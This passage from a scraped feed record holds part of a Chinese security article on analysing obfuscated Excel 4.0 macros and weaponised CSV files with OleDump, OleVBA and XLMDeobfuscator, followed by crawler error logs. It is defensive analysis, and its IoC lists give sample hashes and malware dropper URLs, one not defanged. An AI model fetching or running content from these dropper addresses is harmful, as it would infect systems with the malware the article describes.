class=\"brush:html;toolbar:false\">&#160;&#160;Sub&#160;ShowAllSheets()\n&#160;&#160;&#160;&#160;Dim&#160;sh&#160;As&#160;Worksheet\n&#160;&#160;&#160;&#160;For&#160;Each&#160;sh&#160;In&#160;ActiveWorkbook.Sheets\n&#160;&#160;&#160;&#160;sh.Visible&#160;=&#160;True\n&#160;&#160;&#160;&#160;Next\n&#160;&#160;&#160;&#160;End&#160;Sub</pre><p>如果由于宏被执行而无法打开恶意文件，并且也无法控制执行流程的话，则可以打开另一个工作表，打开VBA编辑器，并按以下方式直接用VBA“导入”恶意文档：</p><pre class=\"brush:html;toolbar:false\">Public&#160;Sub&#160;Convert_XML_To_Excel_From_Local_Path()\n&#160;&#160;&#160;&#160;Dim&#160;xml_File_Path&#160;As&#160;String\n&#160;&#160;&#160;&#160;Dim&#160;wb&#160;As&#160;Workbook\n&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#39;Load&#160;XML&#160;Data&#160;into&#160;a&#160;New&#160;Workbook&#160;-&#160;Code&#160;from&#160;Officetricks.com\n&#160;&#160;&#160;&#160;Application.DisplayAlerts&#160;=&#160;False\n&#160;&#160;&#160;&#160;&#160;xml_File_Path&#160;=&#160;&#34;c:/FileToOpen.xlm&#34;\n&#160;&#160;&#160;&#160;&#160;Set&#160;wb&#160;=&#160;Workbooks.OpenXML(Filename:=xml_File_Path)\n&#160;\n&#160;&#160;&#160;&#160;&#39;Copy&#160;Content&#160;from&#160;New&#160;workbook&#160;to&#160;current&#160;active&#160;Worksheet\n&#160;&#160;&#160;&#160;&#160;wb.Sheets(1).UsedRange.Copy&#160;ThisWorkbook.Sheets(Sheet2).Range(A1)\n&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#39;Close&#160;New&#160;Workbook&#160;&#38;&#160;Enable&#160;Alerts\n&#160;&#160;&#160;&#160;&#160;wb.Close&#160;False\n&#160;&#160;&#160;&#160;&#160;Application.DisplayAlerts&#160;=&#160;True\nEnd&#160;Sub</pre><p>这样，您就可以看到隐藏的工作表或隐藏的单元格了。这里还有一个小技巧，为了快速找到有内容的单元格，可以搜索=，具体如下图所示。</p><p style=\"text-align: left;\">现在，通过选中左上角的方框（即下图中BG35344），就可以看到哪里是起点。在这个文件中，Auto_Open是第一个被调用的函数，你可以在那里找到它的引用。然后，您可能会看到使用了两种主要格式：FORMULA和GOTO。<span style=\"text-align: center;\">&#160;</span><span style=\"text-align: center;\">&#160;</span></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102001149980.png\" title=\"1599026087771027.png\" alt=\"1.png\"/></p><p style=\"text-align: center;\">揭开隐藏的Excel 4.0 Macro的神秘面纱</p><p>这时，您能够以受控的方式执行MACRO 4，从而为XLM去混淆。为此，您可以删除最后一个GOTO，这样就不会把控制流交给去混淆的MACRO，而是停止它们（用HALT代替最后一个GOTO），这样，就可以看到用于该工作表的、经过去混淆处理的代码了。</p><p><strong>IoC:</strong></p><p><strong style=\"white-space: normal;\">·&#160;</strong>d864b4da58253cba29a8106b0727e81852a181f3ac59ec7dfb9b9dee5931b7cc (<a href=\"https://yomi.yoroi.company/report/5eff24af3cef2488de716277/5eff25bbb5b9ad1d88683a58/overview\" target=\"_self\">W2_tax.xls</a>)<br/></p><p><strong style=\"white-space: normal;\">·&#160;</strong>5.182.210.133/get.php (Dropper)</p><p><span style=\"font-size: 20px;\"><strong>由Excel解读的.CSV文件</strong></span></p><p>有时你可能会发现许多.csv文件。这时，可以将其导入到Microsoft Excel中，使其变成“真正的”的Ole文件。事实上，通过OleDump处理攻击者精心制作的csv文件时，有可能会发现一些有趣的事情，比如CSV文件中包含VBA代码或Object。例如，对于sha-256为d5db2034631e56d58dffd797d25d286469f56690a1b00d4e6a0a80c31dbf119e的样本来说，你可能会发现下面的东西（如果用普通的编辑器打开该样本的话，它看上去就是一个正常的文本，并且以逗号为分隔符）。但是，如果通过OleDump打开它的话，则会找到一些可疑的东西。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102002168036.png\" title=\"1599026119178392.png\" alt=\"1.png\"/><span style=\"font-size: 15px;color:black\">&#160; </span></p><p style=\"text-align: center;\">OleDump处理结果</p><p>接下来，您既可以转储代码并进行手动分析，也可以通过代码仿真器进行分析。通过对CSV运行OleVBA，你会发现许多有趣的指标（请看下图）。例如，该工具指出，一旦用Microsoft excel打开该文档，它就会调用AutoExec。此外，还有许多可疑的调用会被执行，如exec、run；此外，一些hex-base64字符串还应用了混淆技术。在这次运行中，它甚至能够解码这些的字符串，并识别IoC，如URLs和文件名。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102002145263.png\" title=\"1599026146100792.png\" alt=\"1.png\"/><span style=\"font-size:15px;color:black\">&#160;</span></p><p style=\"text-align: center;\">oleVBA分析结果</p><p>如果代码仿真器行不通的话，你还可以使用OleDump转储整个代码。一旦转储了代码，就可以通过调试器来分析代码；如果代码未经混淆处理的话，则可以直接读取。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102003155522.png\" title=\"1599026174408538.png\" alt=\"1.png\"/></p><p style=\"text-align: center;\">提取的组件</p><p><strong>IoC</strong><br/></p><p><strong style=\"white-space: normal;\">·&#160;</strong>d5db2034631e56d58dffd797d25d286469f56690a1b00d4e6a0a80c31dbf119e (invoice.csv)</p><p><strong style=\"white-space: normal;\">·&#160;</strong>omamontaggi.[it/bels.exe (Droping WB)</p><p><span style=\"font-size: 20px;\"><strong>XLMDeobfuscator</strong></span></p><p>XLMDeobfuscator是@DissectMalware开发的一款优秀工具。它可以用来解码经过混淆的XLM宏（也就是Excel 4.0宏）。它利用内部的XLM模拟器来解释宏，而不需要完全执行代码。它同时支持xls、xlsm和xlsb格式。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102004379627.png\" title=\"1599026215892051.png\" alt=\"1.png\"/><span style=\"font-size:15px;font-family:&#39;MS Mincho&#39;;color:black\"></span></p><p style=\"text-align: center;\">XLMDeobfuscator</p><p>此外，OleDump插件_biffis能够忽略每一个Excel单元格，并找到函数和公式。通过插件选项-x，它能够显示隐藏的宏XLM；而使用了插件选项-f，该插件将通过解释编码(如十六进制和base64)并打印相关字符串来找出外部链接。</p><p style=\"text-align: center;\"><img src=\"https://i1.wp.com/marcoramilli.com/wp-content/uploads/2020/07/1-12.png?resize=1024%2C829&ssl=1\"/></p><p style=\"text-align: center;\">oledump.py -p plugin_biff --pluginoptions &#34;-x&#34;</p><p><strong>IoC</strong></p><p><strong>·&#160;</strong>1e194edbb1f28b9ecc4dc6a9a1e289d1c404470724f5fb14dd01312ed75bc298 (File_457366.xls)</p><p><strong style=\"white-space: normal;\">·&#160;</strong>p://45[.11[.183[.78/6f04e0be46qb4Zc[.php (Dropper)</p>","descriptionType":"text/html","publishedDate":"Sat, 05 Sep 2020 01:35:00 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101994233494.png","linkMd5":"767cdf6c195e7f1c0458b91104e0ccf8","destWidth":837,"destHeight":43,"sourceBytes":3791,"destBytes":6102,"author":"fanyeee","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101994233494.png":null,"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101994869773.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn71@2020_4/2020/09/05/07-31-22-137_b7eda409fb638a31.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101995443982.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn73@2020_1/2020/09/05/07-31-29-277_b2c7b156f1693a21.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101995143789.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn8@2020_6/2020/09/05/07-31-22-507_e4d925c1f9edaa79.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101996179265.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn77@2020_1/2020/09/05/07-31-24-665_e02b16a579bde3ad.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101997496880.png":null,"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101997142388.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn26@2020_2/2020/09/05/07-31-21-396_923aba3701137f43.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101998162329.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn28@2020_3/2020/09/05/07-31-20-321_2eba06e1b6a48d89.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101998462581.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn86@2020_1/2020/09/05/07-31-28-090_0735cb67130c5018.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101998107036.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn45@2020_3/2020/09/05/07-31-18-018_eb5102593e03f847.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101999178992.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn93@2020_4/2020/09/05/07-31-25-389_84950ca4b12ae30f.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101999346752.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn82@2020_6/2020/09/05/07-31-27-282_69988321de6aeeae.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102000389091.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn66@2020_5/2020/09/05/07-31-29-626_0972a0090a10453b.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102000648897.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn93@2020_2/2020/09/05/07-31-43-981_a80ecbde3f348a0f.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102001106861.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn4@2020_5/2020/09/05/07-31-22-294_0c1794ba27c58380.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102001149980.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn75@2020_4/2020/09/05/07-31-21-347_2ed0f0626c4f6e27.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102002168036.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn45@2020_3/2020/09/05/07-31-29-186_9eba9b2adf716093.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102002145263.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn76@2020_1/2020/09/05/07-31-20-811_ab13673247ac959f.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102003155522.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn50@2020_4/2020/09/05/07-31-29-682_da1ee58a4d66f60b.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102004379627.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn54@2020_6/2020/09/05/07-31-28-404_871b362b410758c9.webp","https://i1.wp.com/marcoramilli.com/wp-content/uploads/2020/07/1-12.png?resize=1024%2C829&ssl=1":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn64@2020_2/2020/09/05/07-31-22-612_f997b630871bf425.webp"},"publishedOrCreatedDate":1599291056257}],"record":{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","feedId":6942,"fetchDate":"Sat, 05 Sep 2020 07:30:56 +0000","fetchMs":3606,"handleMs":5555,"totalMs":108906,"newArticles":0,"totalArticles":20,"status":1,"type":0,"ip":"ad451f163558643b64c25fa9e19a17a0","hostName":"us-015*","requestId":"fd42dafeab9c4316b8213fa8a83e4492_6942","contentType":"text/xml; charset=UTF-8","totalBytes":5411020,"bgimgsTotal":17,"bgimgsGithubTotal":16,"articlesImgsTotal":119,"articlesImgsGithubTotal":112,"successGithubMap":{"myreaderx8":5,"myreaderx15":4,"myreaderx7":4,"myreaderx6":4,"myreaderx16":4,"myreaderx4":5,"myreaderx10":5,"myreaderx32":5,"myreaderx3":4,"myreaderx33":5,"myreaderx11":4,"myreaderx2":5,"myreaderx12":5,"myreaderx1":4,"myreaderx13":4,"myreaderx30":4,"myreaderx31":3,"myreaderx18":3,"myreaderx19":2,"myreaderx":4,"myreaderx25":5,"myreaderx27":4,"myreaderx21":4,"myreaderx22":3,"myreaderx24":5,"myreaderx5oss":4,"myreaderx29":4},"failGithubMap":{"myreaderx14":4,"myreaderx23":3}},"feed":{"createdTime":"2020-08-25 04:33:21","updatedTime":"2020-09-01 09:22:18","id":6942,"name":"嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com","url":"http://www.4hou.com/feed","subscriber":null,"website":null,"icon":"https://www.4hou.com/favicon.ico","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx61/cdn65@2020_4/2020/09/05/07-30-55-487_3d63d92d260693c0.jpg","description":"嘶吼是一家新兴的互联网安全新媒体，为您带来不一样的互联网安全新视界。嘶吼的出现将为信息安全领域带来更有力量的声音，我们的每一声嘶吼，都如雷贯耳；每一个步伐，都掷地有声！","weekly":null,"link":"https://www.4hou.com"},"noPictureArticleList":[{"createdTime":"2020-09-05 15:32:35","updatedTime":"2020-09-05 15:32:35","id":null,"feedId":6942,"linkMd5":"6065d354c99cc3ce6980c438cf2d40b5"},{"createdTime":"2020-09-05 15:32:35","updatedTime":"2020-09-05 15:32:35","id":null,"feedId":6942,"linkMd5":"7c030266888b48c212298d4439949659"},{"createdTime":"2020-09-05 15:32:35","updatedTime":"2020-09-05 15:32:35","id":null,"feedId":6942,"linkMd5":"8d0ba5a94eb804af394fd80b5861516c"},{"createdTime":"2020-09-05 15:32:35","updatedTime":"2020-09-05 15:32:35","id":null,"feedId":6942,"linkMd5":"ddc5f53c84d25939a386e5b2bb709c67"},{"createdTime":"2020-09-05 15:32:35","updatedTime":"2020-09-05 15:32:35","id":null,"feedId":6942,"linkMd5":"767cdf6c195e7f1c0458b91104e0ccf8"}],"tmpCommonImgCdnBytes":940044,"tmpBodyImgCdnBytes":4470976,"tmpBgImgCdnBytes":0,"extra4":{"start":1599291046545,"total":0,"statList":[{"spend":4159,"msg":"获取xml内容"},{"spend":5555,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":80429,"msg":"正文链接上传到cdn"}]},"extra5":119,"extra6":119,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101994233494.png","sourceStatusCode":200,"destWidth":837,"destHeight":43,"sourceBytes":3791,"destBytes":6102,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3401,"convertSpendMs":5,"createdTime":"2020-09-05 15:30:56","host":"us-033*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8,767cdf6c195e7f1c0458b91104e0ccf8","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn85/contents/2020/09/05/07-30-59-661_a98698532d9e3885.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:30:59 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["A180:6385:7A6A59:CE88C8:5F533EB2"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291951"],"x-ratelimit-used":["62"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn85/contents/2020/09/05/07-30-59-661_a98698532d9e3885.webp","historyStatusCode":[],"spendMs":42},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.7 KB","destSize":"6 KB","compressRate":"161%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101994233494.png","sourceStatusCode":200,"destWidth":837,"destHeight":43,"sourceBytes":3791,"destBytes":6102,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2920,"convertSpendMs":4,"createdTime":"2020-09-05 15:30:59","host":"europe21*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8,767cdf6c195e7f1c0458b91104e0ccf8","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn85/contents/2020/09/05/07-31-02-377_a98698532d9e3885.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:31:02 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["8104:B2ED:1335E7C0:173DB8FD:5F533EB3"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291951"],"x-ratelimit-used":["62"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn85/contents/2020/09/05/07-31-02-377_a98698532d9e3885.webp","historyStatusCode":[],"spendMs":176},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.7 KB","destSize":"6 KB","compressRate":"161%"},{"code":1,"isDone":false,"source":"https://pic.36krcnd.com/202009/02013349/87f3dzgqkw75bq94","sourceStatusCode":200,"destWidth":936,"destHeight":132,"sourceBytes":48421,"destBytes":15396,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":959,"convertSpendMs":9,"createdTime":"2020-09-05 15:31:17","host":"europe65*","referer":"https://www.4hou.com/posts/QvrY","linkMd5ListStr":"6065d354c99cc3ce6980c438cf2d40b5","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn19/contents/2020/09/05/07-31-17-724_b999db8f0ca02e97.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:31:17 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["8B72:7A59:D2B07A8:FEE47D1:5F533EBE"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291956"],"x-ratelimit-used":["61"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn19/contents/2020/09/05/07-31-17-724_b999db8f0ca02e97.webp","historyStatusCode":[],"spendMs":246},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"47.3 KB","destSize":"15 KB","compressRate":"31.8%"},{"code":1,"isDone":false,"source":"https://pic.36krcnd.com/202009/02013349/87f3dzgqkw75bq94","sourceStatusCode":200,"destWidth":936,"destHeight":132,"sourceBytes":48421,"destBytes":15396,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1703,"convertSpendMs":9,"createdTime":"2020-09-05 15:31:18","host":"us-010*","referer":"https://www.4hou.com/posts/QvrY","linkMd5ListStr":"6065d354c99cc3ce6980c438cf2d40b5","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn19/contents/2020/09/05/07-31-19-628_b999db8f0ca02e97.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:31:19 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["DCA0:6727:24367A:55837A:5F533EC7"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291956"],"x-ratelimit-used":["61"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn19/contents/2020/09/05/07-31-19-628_b999db8f0ca02e97.webp","historyStatusCode":[],"spendMs":88},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"47.3 KB","destSize":"15 KB","compressRate":"31.8%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074500169617.png","sourceStatusCode":200,"destWidth":722,"destHeight":70,"sourceBytes":3538,"destBytes":8116,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1973,"convertSpendMs":8,"createdTime":"2020-09-05 15:31:20","host":"us-004*","referer":"https://www.4hou.com/posts/mG90","linkMd5ListStr":"7c030266888b48c212298d4439949659","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn91/contents/2020/09/05/07-31-22-628_5016546b70712724.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:31:22 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["B3B6:36B0:84CF56:1397EA7:5F533ECA"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291956"],"x-ratelimit-used":["61"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn91/contents/2020/09/05/07-31-22-628_5016546b70712724.webp","historyStatusCode":[],"spendMs":43},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.5 KB","destSize":"7.9 KB","compressRate":"229.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239247575040.jpeg","sourceStatusCode":200,"destWidth":561,"destHeight":241,"sourceBytes":24191,"destBytes":23756,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":6302,"convertSpendMs":9,"createdTime":"2020-09-05 15:31:16","host":"us-014*","referer":"https://www.4hou.com/posts/o7gK","linkMd5ListStr":"ddc5f53c84d25939a386e5b2bb709c67","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn11/contents/2020/09/05/07-31-22-719_c013459e3d70e382.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:31:22 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["B2B6:4183:3E2777:916D32:5F533ECA"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291951"],"x-ratelimit-used":["62"],"x-xss-protection":["1; 